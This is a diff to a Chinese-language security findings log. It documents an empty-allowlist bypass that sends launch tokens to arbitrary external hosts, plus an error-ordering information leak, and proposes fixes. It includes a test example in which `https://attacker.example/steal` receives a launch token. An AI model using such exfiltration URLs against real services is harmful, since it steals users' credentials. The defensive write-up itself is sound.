@@ -393,3 +393,49 @@ UI 送 `version`,後端 schema 只收 `agent_version` 且沒有 `extra="forbid"`
   **教訓:退役一個假控制項,要把指向它的文件一起改掉才算退役完** —— 否則假控制項
   只是從程式碼搬進了文件,而文件比程式碼更難被測試抓到。兩處已改成
   `ANILA_ALLOW_HTTP_ENDPOINT=1`。
+
+---
+
+## 第五輪(2026-08-05)——專案入口磁貼的驗收帶出來的
+
+### #38 ✅ 空的 `allowed_origins` 不是「不准」,是「全部都准」——launch token 直接送出去 🔴
+
+- **畫面說**:治理中心的服務登記有一格 `allowed_origins`(iframe 來源允許清單)。
+  管理員留白 → 直覺是「我沒有授權任何外部來源」。
+- **實際**:`services/csp/app/api/services.py:185` 是
+
+  ```python
+  if allowed and origin not in allowed:   # ← allowed 是空的就整條跳過
+  ```
+
+  空清單是 falsy,**整個比對被略過**。於是一筆 `entry_url` 指向任意外部主機、
+  `allowed_origins` 留白的服務,啟動時會把 **launch token 併進那個外部網址發出去**,
+  一格檢查都不做。
+- **實測(2026-08-05,本機 pytest)**:`entry_url="https://attacker.example/steal"`
+  + `allowed_origins=[]` + `is_public=True` → `POST .../launch` 回 **200**,
+  `launch_url = "https://attacker.example/steal?launch_token=eyJhbGciOiJSUzI1NiIs…"`。
+- **誰會踩到**:只有**從資料庫/建立 API 生出來**的服務。env 種子那條路安全——
+  `auto_seed.py:74,84` 對絕對 URL 一律回填 `allowed_origins=[origin]`。
+  但建立端點 `services.py:280` 是 `data.get("allowed_origins") or []`,**預設就是空的**。
+  → 管理員用治理中心新增一個外部服務,不填那格,就是這個狀態。
+- **不是新的**:這一行與 `be969f99`(base)逐位元組相同,`wt/fix-launch-tiles` 沒有動它。
+  記在這裡是因為它在該包的驗收中被翻出來,**免得下次有人當成新的迴歸再查一遍**。
+- **修法方向**(不是解答,動之前要先問):把空清單當成「不准跨主機」是最直覺的,
+  但那會**擋掉同源相對路徑**——同源那條路本來就靠「`allowed_origins` 空的時候放行」
+  在走(見 `_validate_launch_entry_url` 的註解)。所以不能只把 `allowed and` 拿掉,
+  要分域:同源(`_SAME_ORIGIN`)空清單放行,跨主機空清單則 fail closed。
+  ⚠ 這會讓**現存**的、留白的跨主機登記全部停掉,是個 breaking change,
+  要先盤點資料庫裡有幾筆、並且給管理員一條看得懂的錯誤訊息。
+
+### #39 設定壞掉的服務,對沒有授權的人回 400 而不是 404
+
+- `services.py` 的 launch 端點裡,`_validate_launch_entry_url` 排在 `can_access_service`
+  **之前**。所以一個 `entry_url` 壞掉的服務,對一個**根本沒有授權**的人會回
+  `400 服務 entry_url 必須是 http(s) URL` ——同時洩漏「這個 id 存在」與「它設定壞了」,
+  而正常的拒絕應該是與「id 不存在」同形的 404。
+- **不是靜默成功**,嚴重度也低(要先有一筆壞掉的登記);記在這裡是因為它與
+  #31 同屬 launch 端點的順序問題,而且 `services.py` 的 release gate 註解引用了這一條。
+- **不是新的**:base 就是這個順序。`wt/fix-launch-tiles` 只把 release gate 與
+  `is_active` 兩道移到驗證之前(修掉「停用+相對路徑回 400」那個),沒有動驗證本身的位置。
+- **修法方向**:把 `_validate_launch_entry_url` 移到 access gate 之後、
+  `create_service_launch` 之前。改動很小,但會動到既有測試對 400 的期待,要一起看。
